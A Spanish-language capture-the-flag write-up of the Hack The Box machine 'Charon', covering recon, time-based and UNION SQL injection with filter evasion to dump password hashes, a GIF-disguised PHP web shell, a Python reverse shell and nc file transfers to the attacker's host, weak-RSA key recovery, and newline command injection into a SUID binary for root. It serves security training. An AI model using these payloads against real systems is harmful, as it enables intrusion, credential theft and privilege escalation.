---
title: Hack The Box Charon
author: k4miyo
date: 2022-01-11
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Hard, Linux]
tags: [PHP, SQL, SQLi, Injection, Web]
ping: true
---

## Charon
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.31.

```bash
❯ ping -c 1 10.10.10.31
PING 10.10.10.31 (10.10.10.31) 56(84) bytes of data.
64 bytes from 10.10.10.31: icmp_seq=1 ttl=63 time=142 ms

--- 10.10.10.31 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 142.073/142.073/142.073/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.31 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-09 20:17 CST
Initiating SYN Stealth Scan at 20:17
Scanning 10.10.10.31 [65535 ports]
Discovered open port 22/tcp on 10.10.10.31
Discovered open port 80/tcp on 10.10.10.31
Completed SYN Stealth Scan at 20:17, 26.47s elapsed (65535 total ports)
Nmap scan report for 10.10.10.31
Host is up, received user-set (0.14s latency).
Scanned at 2022-01-09 20:17:33 CST for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 20 (880B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.31
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.10.31 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-09 20:18 CST
Nmap scan report for 10.10.10.31
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:c7:fb:a2:4b:53:1a:7a:f3:30:5e:b8:6e:ec:83:ee (RSA)
|   256 97:e0:ba:96:17:d4:a1:bb:32:24:f4:e5:15:b4:8a:ec (ECDSA)
|_  256 e8:9e:0b:1c:e7:2d:b6:c9:68:46:7c:b3:32:ea:e9:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Frozen Yogurt Shop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds
```

Vemos el puerto 80 abierto, así que comos simpre vamos a ver a lo que nos enfrentamos con la herramienta `whatweb` antes de ver su contenido vía web.

```bash
❯ whatweb http://10.10.10.31/
http://10.10.10.31/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.31], PoweredBy[:], Script[text/javascript], Title[Frozen Yogurt Shop]
```

No vemos nada interesante, asi que ahora si vamos a valir vía web.

![""](/assets/images/htb-charon/charon-web.png)

Analizando un poco el sitio web, vemos que tenemos las opciones **HOME**, **ABOUT** y **BLOG**. Dentro de **BLOG** tenemos algunas opciones que si seleccionamos, tenemos en la dirección URL el parámetro `id`.

![""](/assets/images/htb-charon/charon-web1.png)

![""](/assets/images/htb-charon/charon-web2.png)

Si cambianos el valor del `id`, tenemos que cambia lo que visualizamos vía web y para este caso, sólo tenemos las opciones 10, 11 y 12; para las demás opciones, el texto desaparece. Por lo tanto, podríamos pensar en realizar una inyección SQL (***SQLi***):

- `http://10.10.10.31/singlepost.php?id=10'-- -` No vemos nada.
- `http://10.10.10.31/singlepost.php?id=10' order by 100-- -` No se nos visualiza nada.
- `http://10.10.10.31/singlepost.php?id=10 and sleep(5)-- -` Vemos que el navegador tarda 5 segundos en responder, por lo tanto el sitio es vulnerabla a ataques de tipo SQLi basado en tiempo.

Como vemos que el recurso es vulnerable a SQLi basado en tiempo. Pensando un poco, podríamos intuir que existen algún gestor de contenido o un panel de login debido a que por detrar está presenta una base de datos. Asi que vamos a tratar de descubrir rutas dentro del servidor web.

```bash
❯ wfuzz -c -L -t 200 --hc=404 --hw=191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.31/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.31/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000016:   403        11 L     32 W       293 Ch      "images"                                                        
000000550:   403        11 L     32 W       290 Ch      "css"                                                           
000000953:   403        11 L     32 W       289 Ch      "js"                                                            
000001112:   403        11 L     32 W       294 Ch      "include"                                                       
000002771:   403        11 L     32 W       292 Ch      "fonts"                                                         
000047682:   403        11 L     32 W       294 Ch      "cmsdata"                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 112.0082
Processed Requests: 61385
Filtered Requests: 61379
Requests/sec.: 548.0399
```

Vemos un recurso intersante llamado `cmsdata`; sin embargo, tiene un código de estado 403 (Forbidden). Pensando un poco, es posible que podamos obtener recursos dentro de ese directorio que nos regrese un código de estado 200. Así que lo primero que haremos, es buscar archivos de extensión php.

```bash
❯ wfuzz -c -L -t 200 --hc=404 --hw=32 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.31/cmsdata/FUZZ.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.31/cmsdata/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000282:   200        97 L     606 W      6426 Ch     "menu"                                                          
000000366:   200        97 L     606 W      6426 Ch     "upload"                                                        
000000053:   200        97 L     606 W      6426 Ch     "login"                                                         
000001706:   200        96 L     596 W      6322 Ch     "forgot"                                                        
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 7160
Filtered Requests: 7156
Requests/sec.: 0
```

Aqui ya tenemos unos archivos que ya debería de llamarnos la atención sería `login.php`; asi que vamos a echarle un ojo.

![""](/assets/images/htb-charon/charon-web3.png)

Podríamos tratar de ingresar credenciales default o típicas; sin embargo, no vamos a conseguir nada. Como sabemos que el sitio es vulnerable a ataques de SQLi, vamos a tratar de inyectar algunos comandos. Para el panel de login no logramos nada; pero si intentamos sobre el recurso `forgot.php`, vemos que se nos muestra una leyenda **Incorrect format**

![""](/assets/images/htb-charon/charon-web4.png)

- `' order by 100-- -` - Incorrect format
- `test@test.com' order by 100-- -` - Error in Database!

Con la inyección anterior, vemos un resultado diferente.

![""](/assets/images/htb-charon/charon-web5.png)

Para trabajar de una forma más cómoda y poder realizar pruebas, vamos a generar un script en python que nos permita realizar las consultas que necesitemos.

```python
#!/usr/bin/python3
#coding:utf-8

import signal, sys, time, requests, re
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
url = "http://10.10.10.31/cmsdata/forgot.php"

def makeRequest(sqli_data):
    try:
        post_data = {
            "email" : "%s" % sqli_data.strip()
        }
        r = requests.post(url, data=post_data)
        response = re.findall(r'h2.*',r.text)[0].split('>')[1].lstrip()
        log.info(response)
    except:
        log.failure("Ha ocurrido un error!")

if __name__ == '__main__':
    while True:
        sqli_data = input("Email: ")
        makeRequest(sqli_data)


```

Una vez que tenemos nuestro script, vamos a realizar algunas pruebas.

```bash
❯ python3 sqli_charon.py
Email: test@test.com' order by 100-- -
[*] Error in Database!    
Email: test@test.com' order by 10-- -
[*] Error in Database!    
Email: test@test.com' order by 9-- -
[*] Error in Database!    
Email: test@test.com' order by 7-- -
[*] Error in Database!    
Email: test@test.com' order by 5-- -
[*] Error in Database!    
Email: test@test.com' order by 4-- -
[*] User not found with that email!    
Email:
```

Para el valor 4, vemos que la respuesta cambia de **Error in Database** a **User not found with that email!**; por lo tanto podríamos pensar que la tabla de la base de datos presenta 4 columnas.

```bash
Email: test@test.com' union select 1,2,3,4-- -
[-] Ha ocurrido un error!
Email:
```

Cuando queremos ejecutar la sentencia `union select`, vemos que ocurre un error; por lo tanto vamos a ocupar un tipo de evasión ya que se observa que hay palabras o caracteres que al servidor no le gusta.

```bash
Email: test@test.com' UNion select 1,2,3,4-- -
[*] Incorrect format    
Email:
```

Vemos que al cambiar unas letras a mayúsculas, ya le gusta al servidor; sin embargo, ya no tenemos la respuesta de **User not found with that email!**; por lo que podrían existir caracteres que no le gustan, pero antes de listar con todas las letras del abecedario, vamos a tratar primero los caracteres especiales.

```bash
Email: test@test.com' UNion select 1,2,3,"a"-- -
[*] Error in Database!    
Email: test@test.com' UNion select 1,2,3,"b"-- -
[*] Error in Database!    
Email: test@test.com' UNion select 1,2,3,"c"-- -
[*] Error in Database!    
Email:  
```

Para hacer un barrido sobre los caracteres especiales, hacremos uso del archivo `/opt/SecLists/Fuzzing/special-chars.txt` (que en caso de no tenerlo, podemos descargar [SecLists](https://github.com/danielmiessler/SecLists) y lo guardamos en `/opt/`). Como la respuesta no es la que buscamos, vamos a tratar de hacer combinaciones de caracteres especiales. Pero para este caso vamos a utilizar la herramienta [BurpSuite](https://portswigger.net/burp)

![""](/assets/images/htb-charon/charon-burp.png)

Vemos que la combinación `@` y `.` generan una respuesta **Email sent to:**, por lo que podriamos pensar que dichos símbolos son necesarios cuando queramos hacer una inyección. Ahora vamos a tratar de obtener el nombre de la base de datos a través del comando `database()` y `concat`.

```bash
❯ python3 sqli_charon.py
Email: test@test.com' UNion select 1,2,3,concat(database(),"@.")-- -
[*] Email sent to: supercms@.=
Email:  
```

Tenemos el nombre de la base de datos `supercms`; por lo que ya encontramos una forma de dumpear la base de datos.

```bash
❯ python3 sqli_charon.py
Email: test@test.com' UNion select 1,2,3,concat(database(),"@.")-- -
[*] Email sent to: supercms@.=
Email: test@test.com' UNion select 1,2,3,concat(user(),"@.")-- -
[*] Email sent to: supercms@localhost@.=
Email: test@test.com' UNion select 1,2,3,concat(table_name,"@.") from information_schema.tables where table_schema="supercms" limit 1,1-- -
[*] Email sent to: license@.=
Email: test@test.com' UNion select 1,2,3,concat(table_name,"@.") from information_schema.tables where table_schema="supercms" limit 2,1-- -
[*] Email sent to: operators@.=
Email: test@test.com' UNion select 1,2,3,concat(table_name,"@.") from information_schema.tables where table_schema="supercms" limit 3,1-- -
[*] User not found with that email!    
Email: 
```

Ya tenemos las tablas que componen la base de datos `supercms` que son `license` y `operators`. Aqui ya nos llama más la atención la segunda tabla, así que vamos a listar las columnas de dicha tabla:

```bash
Email: test@test.com' UNion select 1,2,3,concat(column_name,"@.") from information_schema.columns where table_name="operators" limit 1,1-- -
[*] Email sent to: __username_@.=
Email: test@test.com' UNion select 1,2,3,concat(column_name,"@.") from information_schema.columns where table_name="operators" limit 2,1-- -
[*] Email sent to: __password_@.=
Email: test@test.com' UNion select 1,2,3,concat(column_name,"@.") from information_schema.columns where table_name="operators" limit 3,1-- -
[*] Email sent to: email@.=
Email: test@test.com' UNion select 1,2,3,concat(column_name,"@.") from information_schema.columns where table_name="operators" limit 4,1-- -
[*] User not found with that email!    
Email:  
```

Ya tenemos las columnas de la tabla `operators`, las cuales son: `__username_`, `__password_` y `email`. Por lo tanto, lo que nos queda es listar los datos de dichas columnas.

```bash
[*] Email sent to: test51:5f4dcc3b5aa765d61d8327deb882cf99@.=
Email: test@test.com' UNion select 1,2,3,concat(__username_,0x3a,__password_,"@.") from operators limit 100,1-- -
[*] Email sent to: test101:5f4dcc3b5aa765d61d8327deb882cf99@.=
Email: test@test.com' UNion select 1,2,3,concat(__username_,0x3a,__password_,"@.") from operators limit 200,1-- -
[*] Email sent to: super_cms_adm:0b0689ba94f94533400f4decd87fa260@.=
Email:
```

Vemos varios usuarios, pero ya tenemos uno que nos debe llamar mucho la atención: `super_cms_adm` y tenemos su contraseña hasheada; por lo que vamos a crackearla con la herramienta online [crackstation](https://crackstation.net/)

![""](/assets/images/htb-charon/charon-hash.png)

Ya tenemos unas credenciales a probar, así que validaremos en el panel de login (**Nota**: Simpre guardar las credenciales que vayamos encontrando):

![""](/assets/images/htb-charon/charon-web6.png)

Aqui algo que ya nos llama la atención es que podemos super archivos y en específico, imágenes.

![""](/assets/images/htb-charon/charon-web7.png)

Vamos a tratar de subir un archivo php el cual nos ayude a ejecutar comandos a nivel de sistema.

```php
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

![""](/assets/images/htb-charon/charon-web8.png)

Vamos a cambiar la cabezara de nuestro archivo para que sea considerado como un GIF.

```php
GIF8;
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Pero vemos que nos sigue mandanlo lo mismo, por lo que cambiaremos la extensión de nuestro archivo.

![""](/assets/images/htb-charon/charon-web9.png)

Vemos que nuestro archivo se sube en la ruta `/images/`; sin embargo, no presenta la extensión php que necesitamos para poder ejecutar comandos. Si le echamos un ojo al código fuente del sitio, vemos un campo que se encuentra comentado.

![""](/assets/images/htb-charon/charon-web10.png)

Vamos a descomentar el campo y modificar el tipo. Además, podemos ver que el nombre está medio raro, como que está en base64, por lo que vamos a descifrarlo.

```bash
❯ echo "dGVzdGZpbGUx" | base64 -d; echo
testfile1
```

Vemos que el nombre es `testfile1`, por lo que vamos a cambiar lo que está en base64 por `testfile1`, quedando de la siguiente forma:

![""](/assets/images/htb-charon/charon-web11.png)

Ahora vamos a tratar de subir un archivo nuevamente `shell.gif` y vamos a agregar algo en el nuevo campo que tenemos, por ejemplo `test`.

![""](/assets/images/htb-charon/charon-web12.png)

Y vemos que con dicho campo podemos modificar el nombre del archivo, por lo tanto podríamos subir nuevamente nuestra shell `shell.gif` y aprovechando el campo para cambiar la extensión.

![""](/assets/images/htb-charon/charon-web13.png)

Ahora vamos a validar en la ruta que se nos indica `/images/shell.php`:

![""](/assets/images/htb-charon/charon-web14.png)

Ya logramos ejecución de comandos a nivel de sistema, así que ahora nos queda es entablarnos una reverse shell, por lo que nos ponemos en escucha a través del puerto 443.

```bash
http://10.10.10.31/images/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.31] 56646
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya estamos dentro de la máquina, así que primero vamos a realizar un [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar más cómodos. Vemos que no podemos visualizar la primera flag, así que vamos a enumerar un poco para ver la forma de migrar a otro usuario o escalar privilegios.

```bash
www-data@charon:/home/decoder$ ls -l
total 12
-rw-r--r-- 1 decoder freeeze 138 Jun 23  2017 decoder.pub
-rw-r--r-- 1 decoder freeeze  32 Jun 23  2017 pass.crypt
-r-------- 1 decoder freeeze  33 Jun 23  2017 user.txt
www-data@charon:/home/decoder$
```

Dentro del directorio del usuario `decoder`, vemos algunos archivos los cuales podemos ver el contenido que son `decoder.pub` y `pass.crypt`:

```bash
www-data@charon:/home/decoder$ cat decoder.pub 
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhALxHhYGPVMYmx3vzJbPPAEa10NETXrV3
mI9wJizmFJhrAgMBAAE=
-----END PUBLIC KEY-----
www-data@charon:/home/decoder$ cat pass.crypt ; echo
2OSb"eWgTo7I
www-data@charon:/home/decoder$
```

Lo que haremos primero será transferirnos los archivos a nuestra máquina.

```bash
www-data@charon:/home/decoder$ nc 10.10.14.27 443 < decoder.pub 
www-data@charon:/home/decoder$ nc 10.10.14.27 443 < pass.crypt  
www-data@charon:/home/decoder$ md5sum decoder.pub 
afcb9745eb5e553d7b15077363878c1b  decoder.pub
www-data@charon:/home/decoder$ md5sum pass.crypt 
ade0dc6187e2fa671c1d7a02d3c9f737  pass.crypt
www-data@charon:/home/decoder$ 
```

```bash
❯ nc -nlvp 443 > decoder.pub
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.31] 56648
❯ nc -nlvp 443 > pass.crypt
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.31] 56650
❯ md5sum decoder.pub
afcb9745eb5e553d7b15077363878c1b  decoder.pub
❯ md5sum pass.crypt
ade0dc6187e2fa671c1d7a02d3c9f737  pass.crypt
```

Ahora, de acuerdo con las extensiones, `decoder.pub` podría ser una llave pública y `pass.crypt` es un archivo que ha sido cifrado utilizando la llave privada, pero no contamos con dicha llave; por lo tanto podríamos tratar de obtener la llave privada a partir de la llave pública y para lograrlo, primeramente debemos de encontrar algunas variables que necesitamos (**Nota**: Se comparte un recurso para saber un poco más de este tema [readthedocs](https://pycryptodome.readthedocs.io/en/latest/src/public_key/rsa.html)):

- ***n*** - RSA modulus
- ***e*** - RSA public exponent
- ***p*** - First factor of the RSA modulus
- ***q*** - Second factor of the RSA modulus
- ***d*** - RSA private exponent
- ***m*** - Remainder component

El valor de ***n*** es público y se obtiene de la llave pública y de igual forma el valor de ***e***. Ahora, si el valor de ***n*** es relativamente pequeño, se puede computar ***p*** y ***q*** ya que ***n = p q*** en donde ***p*** y ***q*** son números primos. Asi que vamos a generar un programa en python que nos ayude a generar dichos valores.

```python
#!/usr/bin/python3
#coding:utf-8
  
import os
from Crypto.PublicKey import RSA
from pwn import *
  
f = open ("decoder.pub","r")
key = RSA.importKey(f.read())
e = key.e
n = key.n
f.close()

log.info("El valor de e = %s " % key.e)
log.info("El valor de n = %s " % key.n)
```

Al imprimir las variables, tenemos que:

```bash
❯ python3 decrypter.py
[*] El valor de e = 65537 
[*] El valor de n = 85161183100445121230463008656121855194098040675901982832345153586114585729131
```

Ahora para encontrar ***p*** y ***q*** vamos a hacer uso de [factordb](http://factordb.com/)

![""](/assets/images/htb-charon/charon-pq.png)

```bash
[*] El valor de p = 280651103481631199181053614640888768819 
[*] El valor de q = 303441468941236417171803802700358403049
```

Ahora, el valor de ***m*** lo obtenemos de la siguiente expresión: ***m = n - (p + q - 1)***.

```bash
[*] El valor de m = 85161183100445121230463008656121855193513948103479115215992296168773338557264
```

Para encontrar ***d*** vamos a hacer uso de la **Función inversa multiplicativa modular** y de los valores que encontramos anteriormente que son ***e*** y ***m***:

```python
# Modular multiplicative inverse function in Python
  def egcd(a, b):
      if a == 0:
          return (b, 0, 1)
      else:
          g, y, x = egcd(b % a, a)
          return (g, x - (b // a) * y, y)
  
  def modinv(a, m):
      g, x, y = egcd(a, m)
      if g != 1:
          raise Exception('modular inverse does not exist')
      else:
          return x % m
  
  d = modinv(e,m)
```

```bash
[*] El valor de d = 21250987814893564133283367312544315727523797355452606165102736035279600512161
```

Ya con todos los valores obtenidos, podemos generar una llave privada:

```python
priv_key = RSA.construct((n, e, d, p, q))
```

```bash
[*] La clave privada es:
-----BEGIN RSA PRIVATE KEY-----
MIGsAgEAAiEAvEeFgY9UxibHe/Mls88ARrXQ0RNetXeYj3AmLOYUmGsCAwEAAQIg
LvuiAxyjSPcwXGvmgqIrLQxWT1SAKVZwewy/gpO2bKECEQDTI2+4s2LacjlWAWZA
A2kzAhEA5Eizfe3idizLLBr0vsjD6QIRALlM92clYJOQ/csCjWeO1ssCEQDHxRNG
BVGjRsm5XBGHj1tZAhEAkJAmnUZ7ivTvKY17SIkqPQ==
-----END RSA PRIVATE KEY-----
```

Una vez que tenemos la llave privada, vamos a descifrar el archivo `pass.crypt` mediante la herramienta `openssl` en donde `private.key` es un archivo que contiene nuestra llave privada que generamos y `pass.decrypted` es el archivo `pass.crypt` ya descifrado:

```bash
openssl rsautl -decrypt -inkey private.key -in pass.crypt -out pass.decrypted
```

```bash
❯ cat pass.decrypted
───────┬─────────────────────────────────────
       │ File: pass.decrypted
───────┼─────────────────────────────────────
   1   │ nevermindthebollocks
```

Por lo tanto, nuestro programa en python sería el siguiente:

```python
#!/usr/bin/python3
#coding:utf-8

import os
from Crypto.PublicKey import RSA
from pwn import *

f = open ("decoder.pub","r")
key = RSA.importKey(f.read())
e = key.e
n = key.n
f.close()
# Con factordb.com se puede obtener p y q ya que n es un número relativamente pequeño
p = 280651103481631199181053614640888768819
q = 303441468941236417171803802700358403049

m = n - (p + q - 1)

# Modular multiplicative inverse function in Python
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

d = modinv(e,m)

# Se muestran los valores
log.info("El valor de e = %s " % key.e)
log.info("El valor de n = %s " % key.n)
log.info("El valor de p = %s " % p)
log.info("El valor de q = %s " % q)
log.info("El valor de m = %s " % m)
log.info("El valor de d = %s " % d)

# Se genera la llave privada
priv_key = RSA.construct((n, e, d, p, q))

log.info("La clave privada es:")
print(priv_key.exportKey().decode("utf-8"))

f = open("private.key","w")
f.write(priv_key.exportKey().decode("utf-8"))
f.close()

# Se descifra el archivo pass.crypt

os.system("openssl rsautl -decrypt -inkey private.key -in pass.crypt -out pass.decrypted")

```

Tenemos ahora la contraseña `nevermindthebollocks`, la cual podría ser del usuario **decoder**:

```bash
www-data@charon:/home$ su decoder
Password: 
decoder@charon:/home$ whoami
decoder
decoder@charon:/home$
```

Ya somos el usuario **decoder** y podemos visualizar la flag (user.txt). Ahora nos falta convertirnos en usuario **root**; por lo que vamos a enumerar un poco el sistema.

```bash
decoder@charon:/home$ id
uid=1001(decoder) gid=1001(freeeze) groups=1001(freeeze)
decoder@charon:/home$ sudo -l
[sudo] password for decoder: 
Sorry, user decoder may not run sudo on charon.
decoder@charon:/home$ cd /
decoder@charon:/$ find \-perm -4000 2>/dev/null
./usr/local/bin/supershell
./usr/lib/openssh/ssh-keysign
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/eject/dmcrypt-get-device
./usr/bin/pkexec
./usr/bin/sudo
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/chsh
./usr/bin/passwd
./usr/bin/at
./usr/bin/newgidmap
./usr/bin/newuidmap
./bin/ntfs-3g
./bin/ping6
./bin/mount
./bin/fusermount
./bin/umount
./bin/ping
./bin/su
decoder@charon:/$
```

Vemos un archivo curioso `/usr/local/bin/supershell`, asi que vamos a echarle un ojo ya que tenemos permisos SUID.

```bash
decoder@charon:/$ ls -l /usr/local/bin/supershell
-rwsr-x--- 1 root freeeze 9120 Jun 24  2017 /usr/local/bin/supershell
decoder@charon:/$ /usr/local/bin/supershell
Supershell (very beta)
usage: supershell <cmd>
decoder@charon:/$ /usr/local/bin/supershell whoami
Supershell (very beta)
decoder@charon:/$ strings /usr/local/bin/supershell             
/lib64/ld-linux-x86-64.so.2
tq$t                       
libc.so.6            
setuid             
exit                
strncmp             
strncpy                       
puts              
__stack_chk_fail
printf
strlen
strcspn
system
__libc_start_main
__gmon_start__
GLIBC_2.4
GLIBC_2.2.5
%"       
AWAVA
AUATL
[]A\A]A^A_
|`&><'"\[]{};#
Supershell (very beta)
usage: supershell <cmd>
/bin/ls
++[%s]
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7585
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strncpy@@GLIBC_2.2.5
strncmp@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
strlen@@GLIBC_2.2.5
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
tonto_chi_legge
strcspn@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
exit@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
decoder@charon:/$
```

De las cadenas imprimibles del binario, ya debemos de ver que se hace uso de `/bin/ls` de manera absoluta, es decir, no se hace el llamado a la función `ls` tal cual, si no que se escribe de forma absoluta su ruta; así que vamos a tratar de ocuparla.

```bash
decoder@charon:/$ /usr/local/bin/supershell /bin/ls
Supershell (very beta)
++[/bin/ls]
bin   dev  home        initrd.img.old  lib64    media  opt      root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
decoder@charon:/$ 
decoder@charon:~$ /usr/local/bin/supershell /bin/ls;whoami
Supershell (very beta)
++[/bin/ls]
decoder.pub  pass.crypt  user.txt
decoder
decoder@charon:~$ /usr/local/bin/supershell "/bin/ls;whoami"
Supershell (very beta)
decoder@charon:~$ /usr/local/bin/supershell "/bin/ls;$(whoami)"
Supershell (very beta)
decoder@charon:~$ /usr/local/bin/supershell "/bin/ls$(whoami)"
Supershell (very beta)
++[/bin/lsdecoder]
sh: 1: /bin/lsdecoder: not found
decoder@charon:~$ /usr/local/bin/supershell "/bin/ls$/
> whoami
> "
Supershell (very beta)
++[/bin/ls$/
whoami
]
sh: 1: /bin/ls$/: not found
root
decoder@charon:~$
```

Al realizar varias pruebas, ya encontramos una forma de ejecutar comandos como el usuario **root** y lo logramos escapando del contexto con `$/ \n whoami \n "` y vemos **root**. Por lo tanto, ahora vamos a lanzarnos una `bash`:

```bash
decoder@charon:~$ /usr/local/bin/supershell "/bin/ls$/
> bash
> "
Supershell (very beta)
++[/bin/ls$/
bash
]
sh: 1: /bin/ls$/: not found
root@charon:~# whoami
root
root@charon:~#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
